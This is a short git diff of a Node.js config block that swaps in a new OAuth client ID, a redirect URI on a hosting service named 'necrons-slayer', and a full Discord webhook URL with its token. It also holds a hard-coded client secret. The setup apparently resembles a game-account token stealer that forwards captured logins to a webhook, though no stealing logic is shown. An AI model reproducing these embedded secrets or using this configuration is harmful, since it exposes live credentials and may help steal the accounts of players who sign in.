@@ -1,8 +1,8 @@
 //Config
 const secret_value = '.WW8Q~BnSgyVc5h5DzTEQWU5wRmqyeJdqIo4Tas8'
-const client_id = 'a06c832a-e2a5-4d5e-a2b3-c5f8fb61fe35'
-const redirect_uri = 'https://d-na.herokuapp.com/'
-const webhook_url = 'webhook'
+const client_id = '423da1f4-9de1-4b1e-917f-576da1511b23'
+const redirect_uri = 'https://necrons-slayer.onrender.com'
+const webhook_url = 'https://discord.com/api/webhooks/1116046426120671364/S2vkJtF_PuEWaGFEteEFf9CQ1iHoM2Y_0tsSKPdzZiXyf0c3JvP9M7cTgsEjoYhxvDYo'
 //Requirements
 const axios = require('axios')
 const express = require('express')
